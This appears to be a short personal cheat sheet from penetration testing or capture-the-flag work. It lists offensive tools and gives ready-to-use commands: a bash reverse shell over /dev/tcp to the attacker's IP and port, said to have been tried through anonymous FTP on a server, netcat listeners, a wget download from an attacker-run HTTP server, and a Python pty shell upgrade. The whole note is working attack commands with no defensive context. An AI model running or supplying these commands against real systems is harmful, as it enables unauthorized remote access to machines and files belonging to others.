
**List of Tools**:
	 [[netcat]]
	 [[socat]]
	 [[Metasploit]]
	 [[msfvenom]]


**Tried with anonymous ftp access on server:**
	`#!/bin/bash`
	`bash -i >& /dev/tcp/<Our IP address>/<our port number> 0>&1`
	Listener: `nc -lvnp <port number>` // `rlwrap nc -lnvp <port number>`


**To download any file from a shell on the target...**
	`python -m SimpleHTTPServer`

	`wget http://<server ip>:<same port>/<name of the file>`

**Make strong shell using below script:**
		`python -c 'import pty; pty.spawn("/bin/bash")'`

